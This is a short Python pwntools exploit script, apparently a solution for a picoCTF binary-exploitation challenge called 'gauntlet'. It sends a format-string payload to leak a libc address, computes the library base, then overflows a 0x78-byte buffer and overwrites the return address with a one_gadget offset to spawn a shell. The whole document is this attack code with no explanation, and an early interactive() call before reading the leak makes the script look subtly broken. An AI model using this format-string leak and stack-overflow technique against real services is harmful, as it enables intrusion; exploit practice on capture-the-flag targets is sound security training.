from pwn import *

# r = process('./gauntlet')
r = remote('mercury.picoctf.net', 37740)

'''
0x4f3d5
0x4f432 
0x10a41c
'''

payload = ''
payload += '%23$p'

r.sendline(payload)
r.interactive()
leak = int(r.recv(), 16)
base = leak - 0x021bf7
rop = base + 0x4f432

payload = b''
payload += b'a'*0x78
payload += p64(rop)

pause()
r.sendline(payload)

r.interactive()
